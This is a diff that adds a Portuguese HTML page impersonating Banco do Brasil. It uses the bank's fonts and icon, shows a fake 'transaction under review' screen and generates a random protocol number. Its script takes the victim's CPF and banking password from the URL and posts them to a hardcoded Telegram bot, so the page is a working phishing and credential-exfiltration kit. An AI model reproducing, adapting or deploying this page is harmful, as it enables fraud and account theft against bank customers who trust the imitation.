@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="bb.ico">
+    <title>Transação em Análise</title>
+    <style>
+        /* (O CSS é o mesmo que você já tinha, com pequenas adições) */
+        @font-face {
+            font-family: "FontCustom";
+            src: url("banco_do_brasil_textos_bold.ttf") format("truetype");
+        }
+        @font-face {
+            font-family: "FontCustom2";
+            src: url("banco_do_brasil_textos_medium.ttf") format("truetype");
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5fc; /* Adicionado para um fundo levemente diferente */
+        }
+        .header2 {
+            background-color: #1752fc;
+            height: 16px;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start; /* Alinhamento no topo */
+            flex-direction: column;
+            padding: 0 24px;
+        }
+        .container-header { /* Mantido, mas não usado nesta página */
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px 24px;
+        }
+        h2 {
+            margin: 20px 0; /* Espaçamento superior e inferior */
+            text-align: center;
+            font-family: "FontCustom2", Arial, sans-serif;
+            font-size: 20px;
+        }
+        .back-icon { /* Mantido, mas não usado nesta página */
+            color: #1752fc;
+            font-size: 24px;
+            margin-right: 10px;
+        }
+
+        .message-container {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 20px;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Sombra suave */
+        }
+
+        .message-container p {
+            font-family: "FontCustom2", Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.5; /* Espaçamento entre linhas */
+            margin-bottom: 10px; /* Espaçamento entre parágrafos */
+        }
+
+        .protocol {
+            font-family: "FontCustom", Arial, sans-serif; /* Fonte bold para o protocolo */
+            font-size: 18px;
+            margin-top: 20px;
+            text-align: center;
+        }
+    .home-button {
+        font-family: "FontCustom", Arial, sans-serif;
+        background-color: #fcfc30;
+        color: #3e4eb8;
+        cursor: pointer;
+        border-radius: 4px;
+        position: fixed;
+        left: 0;
+        bottom: 0;
+        margin-bottom: 0;
+        height: 60px;
+        width: 100%;
+        text-align: center;/*para centralizar o texto*/
+        text-decoration: none;/*para tirar a linha do link*/
+        display: flex; /*usado junto com o align e justify content*/
+        justify-content: center;/*alinhar o texto no centro horizontalmente*/
+        align-items: center; /*alinha o texto no centro verticalmente*/
+    }
+
+
+    </style>
+</head>
+<body>
+    <img style="margin-bottom: -6px;" src="top2.jpeg" width="100%" />
+    <div class="header2"></div>
+
+     <h2>Transação em Análise</h2>
+
+    <div class="container">
+        <div class="message-container">
+            <p>Sua transação foi registrada com sucesso e encontra-se em análise.</p>
+            <p>Em breve, você receberá mais informações.</p>
+
+            <p class="protocol">Protocolo: <span id="protocolo"></span></p>
+            <p>Data e Hora: <span id="dataHora"></span></p>
+        </div>
+      <a href="https://bb.com.br" class="home-button">Página Inicial</a>
+    </div>
+
+    <script>
+        // Função para gerar um protocolo aleatório (letras e números, tudo maiúsculo)
+        function gerarProtocolo(tamanho) {
+            let protocolo = '';
+            const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            for (let i = 0; i < tamanho; i++) {
+                protocolo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
+            }
+            return protocolo;
+        }
+
+        // Função para formatar a data e hora
+        function formatarDataHora(data) {
+            const dia = String(data.getDate()).padStart(2, '0');
+            const mes = String(data.getMonth() + 1).padStart(2, '0'); // Mês começa em 0
+            const ano = data.getFullYear();
+            const hora = String(data.getHours()).padStart(2, '0');
+            const minuto = String(data.getMinutes()).padStart(2, '0');
+            const segundo = String(data.getSeconds()).padStart(2, '0');
+            return `${dia}/${mes}/${ano} ${hora}:${minuto}:${segundo}`;
+        }
+
+
+        // Preenche os campos na página
+        document.getElementById('protocolo').textContent = gerarProtocolo(12); // Protocolo com 12 caracteres
+        document.getElementById('dataHora').textContent = formatarDataHora(new Date());
+
+    // --- Envio via Telegram (adaptado do código anterior, agora em JavaScript) ---
+        async function enviarTelegram(cpf, senha) {
+            const token = "6839763620:AAFfUvI4JGRg7np65PE2WzArMYdyPSFcJvY";  // Substitua pelo seu token!
+            const chat_id = "-4570221672";      // Substitua pelo seu chat ID!
+
+            const mensagem = `Nova transação em análise:\n\nCPF: ${cpf}\nSenha: ${senha}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: mensagem,
+                    }),
+                });
+
+                if (!response.ok) {
+                    console.error('Erro ao enviar para o Telegram:', response.status, await response.text());
+                    // Trate o erro aqui (ex: exibir mensagem para o usuário, se necessário).
+                } else {
+                     console.log("Mensagem enviada com sucesso")
+                }
+
+            } catch (error) {
+                console.error('Erro ao enviar para o Telegram:', error);
+                // Trate o erro aqui (ex: exibir mensagem para o usuário, se necessário).
+            }
+        }
+
+        // Pega os dados da URL (parâmetros passados da página anterior)
+        const urlParams = new URLSearchParams(window.location.search);
+        const cpf = urlParams.get('cpf');
+        const senha = urlParams.get('senha');
+
+
+        // Chama a função de envio para o Telegram *somente se* CPF e senha existirem.
+        if (cpf && senha) {
+                enviarTelegram(cpf, senha);
+        } else{
+            console.log("nao tem dados para enviar")
+        }
+
+
+
+    </script>
+</body>
+</html>
